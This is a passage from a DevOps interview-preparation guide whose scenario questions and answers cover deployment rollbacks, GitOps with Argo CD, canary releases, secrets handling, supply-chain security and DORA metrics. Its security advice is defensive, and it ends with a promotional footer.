4. For payments I choose canary with automated analysis, falling back to blue-green if the DB change is incompatible.

**Why →** The cost of failure is high, so we want progressive exposure and fast rollback.

**Interview tip →** Mention backward-compatible DB changes as the real prerequisite for all three.

</details>

### Q157. A deployment needs to be rolled back at 2 AM. What does your rollback look like? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Speed and safety matter.

**What I'd do →**
1. Kubernetes: `kubectl rollout undo deployment/app -n prod` and `kubectl rollout status deployment/app`.
2. GitOps: `git revert <sha>` and let Argo CD/Flux sync, so Git stays the truth.
3. Verify with health checks and dashboards, then open an incident ticket.

**Why →** Rollback should be a rehearsed one-command operation, not a rebuild.

**Interview tip →** Rolling back application code is easy; rolling back data is not, so say that.

</details>

### Q158. You adopt Argo CD. How do you structure repositories and environments? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** GitOps layout.

**What I'd do →**
1. Separate the app source repo from a config repo holding manifests (Helm values or Kustomize overlays) per environment: `apps/payments/overlays/{dev,staging,prod}`.
2. CI builds the image, then updates the image tag in the config repo via PR (or Argo CD Image Updater).
3. Use an ApplicationSet to generate one Application per env/cluster.

**Why →** Config changes get separate history, access control and promotion flow.

**Interview tip →** Do not store manifests in the same repo if you want prod promotion to be gated separately.

</details>

### Q159. Someone `kubectl edit`s a production deployment; an hour later it reverts. Explain. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Argo CD self-heal reverted drift.

**What I'd do →**
1. Check the Application: `argocd app get payments` shows `OutOfSync` then `Synced` with `selfHeal: true`.
2. Make the change in Git so the desired state matches.
3. For emergencies pause sync with `argocd app set payments --sync-policy none` or annotate, and then reconcile through Git.

**Why →** In GitOps Git is the source of truth and the controller continuously reconciles.

**Interview tip →** Self-heal plus prune is powerful; know the risk of auto-prune.

</details>

### Q160. Promoting a release from staging to production in GitOps: what is the mechanism? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Promotion is a Git change.

**What I'd do →**
1. After staging is healthy, a promotion job opens a PR copying the verified image digest into `overlays/prod`.
2. Required reviewers approve; merge triggers Argo CD sync to production.
3. Optionally use Kargo or Argo Rollouts to manage staged promotion.

**Why →** A PR gives audit, approval and an easy revert.

**Interview tip →** Promote the same digest, never rebuild.

</details>

### Q161. A canary deploy needs automated rollback when the error rate rises. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Metric-driven progressive delivery.

**What I'd do →**
1. Use Argo Rollouts with a canary strategy: `setWeight: 10`, `pause: {duration: 5m}`, `analysis` step.
2. Define an `AnalysisTemplate` querying Prometheus: success rate `sum(rate(http_requests_total{status!~"5.."}[5m])) / sum(rate(http_requests_total[5m])) > 0.99`.
3. On failure the Rollout aborts and returns traffic to stable automatically.

**Why →** Machines react faster than on-call humans, and the blast radius stays small.

**Interview tip →** Pair with a traffic router (Istio, NGINX, ALB) for precise percentage splits.

</details>

### Q162. Database schema must change with zero downtime during a rolling deploy. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Old and new app versions share a DB during rollout.

**What I'd do →**
1. Use expand-contract: first add the new column (nullable), deploy code that writes both, backfill, switch reads, and only later drop the old column.
2. Run migrations as a separate pre-deploy job (Flyway/Liquibase) with timeouts and lock awareness.
3. Never make a breaking migration in the same release as the code that needs it.

**Why →** Backward-compatible steps allow safe rollback at every stage.

**Interview tip →** Expand/contract (parallel change) is the key phrase.

</details>

### Q163. Feature flags vs canary: when would you use each? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Decouple deploy from release.

**What I'd do →**
1. Deploy code dark behind a flag (OpenFeature with LaunchDarkly, Unleash or Flagsmith).
2. Enable gradually by user segment, with a kill switch.
3. Use canary to validate the binary/infrastructure and flags to validate the feature.

**Why →** Flags allow instant disable without a redeploy.

**Interview tip →** Clean up stale flags or they become tech debt.

</details>

### Q164. Your Helm upgrade failed halfway. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Partial release state.

**What I'd do →**
1. `helm history app -n prod` to see revisions and status.
2. `helm rollback app <rev> -n prod --wait`.
3. Use `helm upgrade --install --atomic --timeout 10m` in CI so failures roll back automatically.
4. Inspect with `helm get manifest` and `kubectl describe`.

**Why →** `--atomic` rolls back on failure and keeps the release usable.

**Interview tip →** Know `pending-upgrade` status recovery.

</details>

### Q165. Argo CD shows an app permanently OutOfSync due to a field changed by an operator or HPA. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Controller-managed fields conflict with Git.

**What I'd do →**
1. Identify the diff: `argocd app diff payments`.
2. Add `ignoreDifferences` for the field, for example `/spec/replicas` when an HPA scales.
3. Or remove `replicas` from the manifest when using an HPA.

**Why →** Git should not own fields controlled by another controller.

**Interview tip →** `ignoreDifferences` with `jsonPointers` or `jqPathExpressions`.

</details>

### Q166. Multi-region deployment: how do you roll out safely? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Reduce regional blast radius.

**What I'd do →**
1. Deploy in waves: canary region, then 25%, then all, with bake time and automated health gates between waves.
2. Use ApplicationSets with sync waves or a progressive promotion tool.
3. Keep rollback per region independent and keep global config changes out of the same wave.

**Why →** A bad release should affect one region, not the world.

**Interview tip →** Mention "cell-based" or ring deployments.

</details>

### Q167. Secrets in a GitOps repo: how do you handle them? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Git must not hold plaintext secrets.

**What I'd do →**
1. Use External Secrets Operator syncing from AWS Secrets Manager/Vault into Kubernetes Secrets, with only `ExternalSecret` objects in Git.
2. Or encrypt in Git with Sealed Secrets or SOPS (age/KMS).
3. Rotate at the source and let the operator refresh.

**Why →** Git stores references or ciphertext, never raw values.

**Interview tip →** ESO keeps secret values out of Git entirely, SOPS keeps them encrypted in Git.

</details>

### Q168. A deployment pipeline needs a smoke test after rollout and automatic rollback on failure. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Post-deploy verification.

**What I'd do →**
```bash
kubectl rollout status deploy/app -n prod --timeout=300s
curl -fsS https://app.example.com/healthz
./smoke-tests.sh || { kubectl rollout undo deploy/app -n prod; exit 1; }
```
In Argo CD use PostSync hook jobs; in Argo Rollouts use analysis.

**Why →** A deploy is not done until it is verified.

**Interview tip →** Verify through the real ingress path, not only pod readiness.

</details>

### Q169. Recreate strategy vs rolling: when is downtime acceptable? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Some workloads cannot run two versions.

**What I'd do →**
1. Use `strategy: Recreate` for apps with an exclusive resource lock (single-writer volume, schema-incompatible versions) and where a short outage is acceptable.
2. Use RollingUpdate with `maxSurge`/`maxUnavailable` and readiness probes for stateless services.

**Why →** Rolling needs version coexistence; if impossible, Recreate is honest and simple.

**Interview tip →** Readiness probes make rolling updates safe.

</details>

### Q170. Deployments occasionally take down the service for 30 seconds even with rolling updates. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Graceful shutdown or readiness gaps.

**What I'd do →**
1. Add a correct readiness probe and `minReadySeconds`.
2. Add `preStop: sleep 10` and a `terminationGracePeriodSeconds` longer than the drain time, so load balancers deregister before SIGTERM.
3. Set `maxUnavailable: 0` and a PodDisruptionBudget.
4. Ensure the app handles SIGTERM by finishing in-flight requests.

**Why →** Endpoints removal and SIGTERM race each other, causing dropped connections.

**Interview tip →** The preStop sleep is a well-known trick.

</details>

### Q171. How do you deploy the same Helm chart to 5 clusters with small differences? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Fleet deployment.

**What I'd do →**
1. One chart, per-cluster values files (`values-prod-eu.yaml`) layered on common `values.yaml`.
2. Argo CD ApplicationSet with a cluster generator and templated values paths.
3. Promote chart version changes through environments.

**Why →** The templated set scales to many clusters without copy-paste.

**Interview tip →** Keep differences in data, not in forked charts.

</details>

### Q172. A new release is stuck: pods stay in `ImagePullBackOff` right after CI pushed the image. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Registry auth or tag mismatch.

**What I'd do →**
1. `kubectl describe pod` and read the event: `Failed to pull image ... not found` or `unauthorized`.
2. Verify the tag exists: `docker manifest inspect registry/app:tag`.
3. Check `imagePullSecrets` on the ServiceAccount.
4. Ensure the deploy step ran after the push finished.

**Why →** The event message tells you which of the three it is.

**Interview tip →** CI should wait for the push to succeed before updating manifests.

</details>

### Q173. Management wants a deployment every day but releases currently happen monthly with a long manual checklist. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Release process is the bottleneck.

**What I'd do →**
1. Automate every checklist item that is mechanical: tests, scans, change records.
2. Reduce batch size via trunk-based development and feature flags.
3. Add progressive delivery and automatic rollback to reduce fear.
4. Measure DORA metrics to show progress.

**Why →** Small, frequent changes are less risky than large, rare ones.

**Interview tip →** Frame it as lowering risk per change.

</details>

### Q174. Which deployment approach for a stateful service such as a database cluster? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** State changes the rules.

**What I'd do →**
1. Use operators (Zalando/CloudNativePG) and StatefulSets with `updateStrategy` partitions, upgrading replicas first then failing over the primary.
2. Take a verified backup/snapshot before the upgrade.
3. Test upgrade and rollback in staging with production-like data.

**Why →** Data format changes may not be reversible, so backups are the real rollback.

**Interview tip →** Say that rollback for stateful workloads means restore.

</details>

### Q175. A hotfix must bypass the normal 2-hour pipeline. How do you handle it responsibly? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Urgency versus control.

**What I'd do →**
1. Maintain a fast path: hotfix branch, mandatory fast checks (build, unit, critical smoke), one approver, direct promotion.
2. Log it and run the full suite right after.
3. Review in a post-incident process; do not allow ad-hoc manual deploys.

**Why →** A defined fast lane avoids shadow processes.

**Interview tip →** Emergency changes must still leave an audit trail.

</details>

### Q176. You have to choose between push-based CD (pipeline runs kubectl) and pull-based GitOps. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Trade-offs.

**What I'd do →**
1. Pull-based (Argo CD/Flux): the cluster credentials stay inside the cluster, drift is corrected, Git is the audit trail.
2. Push-based: simpler for small setups, but CI holds cluster credentials and cannot detect drift.
3. I choose pull for production Kubernetes and push for simple VMs or serverless.

**Why →** Reducing credential exposure and continuous reconciliation are the big wins.

**Interview tip →** State the trade-off, then pick.

</details>

### Q177. How would you deploy a serverless function safely (Lambda)? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Versioned, shiftable deploys.

**What I'd do →**
1. Publish an immutable version and point an alias (`live`) to it.
2. Use CodeDeploy traffic shifting: `Canary10Percent5Minutes` with CloudWatch alarms for rollback (via SAM `DeploymentPreference`).
3. Deploy infrastructure with IaC from the pipeline using OIDC.

**Why →** Aliases enable weighted traffic and instant rollback.

**Interview tip →** Versions are immutable, aliases are movable.

</details>

### Q178. Config changes (not code) cause outages. How do you put them through the pipeline? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Config is code.

**What I'd do →**
1. Store config in Git, validate with schema checks and `kubeconform`/`conftest`.
2. Roll out through the same staged environments and canaries.
3. Use checksum annotations so pods restart when ConfigMaps change.

**Why →** Config rolls deserve the same rigor as code.

**Interview tip →** Many large outages are config pushes.

</details>

### Q179. Two teams deploy to the same cluster; one team's bad manifest affected the other. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Weak multi-tenancy.

**What I'd do →**
1. Namespaces per team with RBAC, ResourceQuotas and LimitRanges, NetworkPolicies.
2. Argo CD AppProjects restricting source repos, destinations and allowed resource kinds.
3. Admission policies (Kyverno/Gatekeeper) to block cluster-scoped resources and privileged pods.

**Why →** Platform guardrails prevent one tenant from affecting another.

**Interview tip →** AppProjects are the GitOps tenancy boundary.

</details>

### Q180. How do you verify a deployment actually reached users, not only that pods are Ready? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Ready does not equal working.

**What I'd do →**
1. Run synthetic checks through the public endpoint after rollout.
2. Watch RED metrics (rate, errors, duration) for the new version using a `version` label.
3. Annotate the deploy in Grafana to correlate changes with metrics.

**Why →** Real traffic confirms what probes cannot.

**Interview tip →** Deployment markers on dashboards shorten incident triage.

</details>

---

## Secrets, Supply Chain and DORA

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q181. A developer committed an AWS key to a public repo. Walk through your response. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Active compromise until proven otherwise.

**What I'd do →**
1. Deactivate and rotate the key at once: `aws iam update-access-key --access-key-id AKIA... --status Inactive --user-name ci-user`.
2. Review CloudTrail for use of that key and revoke sessions.
3. Remove it from Git (`git filter-repo`) after rotation, and enable push protection and gitleaks in CI.
4. Document and fix the root cause with OIDC or a vault.

**Why →** Bots scrape public commits within minutes.

**Interview tip →** Rotation comes first, cleanup second.

</details>

### Q182. How do you stop secrets from being committed in the first place? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Preventive controls at several layers.

**What I'd do →**
1. Local pre-commit hook with gitleaks or detect-secrets.
2. Server-side: GitHub secret scanning with push protection or GitLab secret push protection.
3. CI scan on every PR as a backstop.

**Why →** Layered detection catches what one layer misses.

**Interview tip →** Prevention beats cleanup.

</details>

### Q183. The pipeline needs access to 15 different secrets across environments. How do you manage them? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secret sprawl.

**What I'd do →**
1. Central secret manager (Vault, AWS Secrets Manager) organised by environment path.
2. CI authenticates with workload identity (OIDC) and a role scoped to the paths for the environment.
3. Audit access and rotate on a schedule.

**Why →** One store with identity-based access is auditable and rotatable.

**Interview tip →** Avoid copying secrets into each CI project.

</details>

### Q184. Explain SLSA and how you would raise a pipeline's level. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Supply-chain maturity framework.

**What I'd do →**
1. Build in a hosted, scripted, ephemeral environment (Build L1-L2) and generate provenance.
2. Use a hardened builder where provenance is signed by the platform, not the user-controlled build (Build L3), for example GitHub's `attest-build-provenance` or `slsa-github-generator`.
3. Verify provenance before deploy.

**Why →** Provenance proves what source and builder produced an artifact.

**Interview tip →** The key point is that signing keys should not be accessible to build steps.

</details>

### Q185. How do you verify only signed images run in Kubernetes? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Admission-time enforcement.

**What I'd do →**
1. Sign in CI with `cosign sign` (keyless via OIDC).
2. Install Kyverno with a `verifyImages` policy requiring the signature from the CI identity and issuer.
3. Start in `Audit`, then switch to `Enforce`.

**Why →** Unsigned or foreign images are rejected at the API server.

**Interview tip →** Mention rolling out in audit mode first.

</details>

### Q186. A popular npm package your build uses is reported as compromised. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Supply-chain incident.

**What I'd do →**
1. Find affected builds: search lockfiles and SBOMs for the package and version.
2. Pin or override to a safe version, block the bad version in Nexus, and rebuild.
3. If it ran in CI, treat that environment's secrets as exposed and rotate.
4. Check install scripts and review recent network egress.

**Why →** Installing a package executes code in CI with its secrets.

**Interview tip →** Mention `npm ci --ignore-scripts` and cooldown windows for new versions.

</details>

### Q187. Dependency update PRs pile up. How do you keep dependencies fresh without chaos? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Automated updates need triage rules.

**What I'd do →**
1. Renovate or Dependabot with grouped updates, schedule and PR limits.
2. Auto-merge patch/minor of low-risk dependencies after tests pass.
3. Major updates are reviewed manually.

**Why →** Small frequent upgrades are easier than annual big-bang upgrades.

**Interview tip →** Good tests are the prerequisite for auto-merge.

</details>

### Q188. Define the four DORA metrics and how you would measure them. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Delivery performance.

**What I'd do →**
1. Deployment frequency: successful production deploys per day, from deployment events.
2. Lead time for changes: commit to production, from SCM and deploy timestamps.
3. Change failure rate: share of deploys needing rollback/hotfix.
4. Time to restore service (failed deployment recovery time): incident start to resolution.

**Why →** They measure speed and stability together.

**Interview tip →** Mention that they are team-level indicators, not individual performance scores.

</details>

### Q189. Leadership wants to use DORA metrics to rank engineers. How do you respond? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Goodhart's law risk.

**What I'd do →**
1. Explain that metrics are for teams and systems; ranking people encourages gaming (splitting commits, skipping incident reports).
2. Use trends for improvement conversations and pair with qualitative signals.
3. Pick one bottleneck at a time to improve.

**Why →** A measure used as a target stops being a good measure.

**Interview tip →** Showing judgment here scores well.

</details>

### Q190. Lead time is 12 days even though CI takes 20 minutes. Where do you look? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Waiting time dominates.

**What I'd do →**
1. Break the timeline: PR open, first review, approval, merge, deploy.
2. Typically review wait and batching of releases are the big parts.
3. Fix with smaller PRs, review SLAs, auto-merge and continuous deployment.

**Why →** Pipeline speed is rarely the main source of lead time.

**Interview tip →** Value stream mapping.

</details>

### Q191. How do you secure the CI/CD system itself as part of the attack surface? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** CI is a high-value target.

**What I'd do →**
1. Least-privilege tokens, short-lived credentials and OIDC.
2. Ephemeral isolated runners, restricted egress, pinned actions and images.
3. Branch protection, required reviews on pipeline files, and audit logs.
4. Separate build and deploy privileges; monitor for anomalous pipeline changes.

**Why →** Compromising CI often means compromising production.

**Interview tip →** Reference the OWASP Top 10 CI/CD Security Risks.

</details>

### Q192. A third party wants to deploy into your production through your pipeline. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** External trust.

**What I'd do →**
1. Do not share credentials; give them PR access to a config repo with review.
2. Their changes pass the same policy gates, signed artifact verification and approval.
3. Scope deploy identity to their namespace only.

**Why →** Review and policy let you accept contributions without granting production access.

**Interview tip →** GitOps makes this natural.

</details>

### Q193. Pipeline has `curl | sh` installers pulled at build time. Why is it risky, and what is the fix? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Unverified remote code execution.

**What I'd do →**
1. Download a pinned version, verify its checksum or signature (`sha256sum -c`), and then install.
2. Better, bake the tool into the build image.
3. Mirror binaries in your artifact repo.

**Why →** The remote script can change at any moment.

**Interview tip →** Checksums pinned in Git give verifiable installs.

</details>

### Q194. How would you handle secrets rotation for a database used by 20 pipelines without downtime? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Safe rotation.

**What I'd do →**
1. Use dual-credential rotation (two valid users, alternate) or Vault dynamic credentials.
2. Pipelines fetch secrets at runtime, so they pick the new value automatically.
3. Rotate on a schedule and test the process regularly.

**Why →** Overlap windows avoid breaking in-flight jobs.

**Interview tip →** Runtime retrieval is what makes rotation painless.

</details>

### Q195. What is a reasonable DORA improvement plan for a team that deploys monthly with a 25% change failure rate? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Low frequency and low stability reinforce each other.

**What I'd do →**
1. First raise stability: automated tests, staging parity, canary and rollback.
2. Then reduce batch size with trunk-based development and feature flags.
3. Increase frequency stepwise (monthly, weekly, daily).
4. Review each failure blamelessly and fix systemic causes.

**Why →** Speed without safety just fails faster.

**Interview tip →** Fix confidence first, cadence second.

</details>

### Q196. A compliance team requires separation of duties: the person who writes code cannot deploy it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** SoD without slowing teams.

**What I'd do →**
1. Require a reviewer who is not the author, enforced by branch protection ("require approval from someone other than the last pusher").
2. Production environment approvals by a different group.
3. Auditors read the pipeline logs showing author, reviewer, approver.

**Why →** Automated enforcement beats manual sign-off sheets.

**Interview tip →** Compliance as code.

</details>

### Q197. You need to scan Infrastructure-as-Code in the pipeline for misconfigurations. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Shift-left for IaC.

**What I'd do →**
1. Run `checkov -d .` or `trivy config .` on every PR and `conftest test plan.json` for custom policy.
2. Fail on high severity and allow documented suppressions.
3. Show results in PR annotations or SARIF.

**Why →** Catching an open S3 bucket in a PR is cheaper than in production.

**Interview tip →** Policy as code with OPA.

</details>

### Q198. The auditors ask what happens if the CI vendor (GitHub or GitLab SaaS) is down during an incident. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** CI as a dependency of recovery.

**What I'd do →**
1. Keep a documented break-glass deploy path that does not require CI (a locally runnable script with audited credentials).
2. Mirror critical repos and keep artifacts in your own registry.
3. Practise it in game days.

**Why →** You must be able to ship a fix when the pipeline is unavailable.

**Interview tip →** Break-glass access with audit.

</details>

### Q199. How do you reduce blast radius if a pipeline credential is stolen? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Assume breach.

**What I'd do →**
1. Short-lived credentials via OIDC with narrow trust conditions.
2. Per-environment roles; no shared admin role.
3. Alerts on unusual use (CloudTrail anomaly, new region) and an automated revoke runbook.

**Why →** Short life and narrow scope limit damage.

**Interview tip →** Least privilege plus short TTL.

</details>

### Q200. If you could change three things in an average company's CI/CD, what would they be? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Prioritisation question.

**What I'd do →**
1. Build once, promote the same signed artifact through environments.
2. Make pipelines declarative, versioned and reusable, with fast feedback under 10 minutes.
3. Replace static secrets with workload identity, and add automated rollback with metrics.

**Why →** These give the largest gains in speed, safety and security.

**Interview tip →** Tie each choice to a measurable DORA improvement.

</details>

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
